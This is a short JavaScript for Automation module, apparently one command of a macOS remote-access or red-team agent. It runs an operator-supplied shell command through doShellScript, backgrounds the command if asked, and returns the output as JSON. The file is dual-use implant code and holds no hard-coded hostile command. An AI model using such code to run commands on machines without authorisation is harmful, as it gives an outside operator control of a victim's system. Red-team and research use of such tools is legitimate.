exports.shell = function(task, command, params){
	//simply run a shell command via doShellScript and return the response
	let response = "";
	try{
	    if(params[params.length-1] == "&"){
	        //doShellScript actually does macOS' /bin/sh which is actually bash emulating sh
	        //  so to actually background a task, you need "&> /dev/null &" at the end
	        //  so I'll just automatically fix this so it's not weird for the operator
	        params = params + "> /dev/null &";
	    }
		response = currentApp.doShellScript(params);
		if(response == undefined || response == ""){
		    response = "No Command Output";
		}
		response = response.replace(/\r/g, "\n");
		return JSON.stringify({"user_output":response, "completed": true});
	}
	catch(error){
		return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
	}
};
COMMAND_ENDS_HERE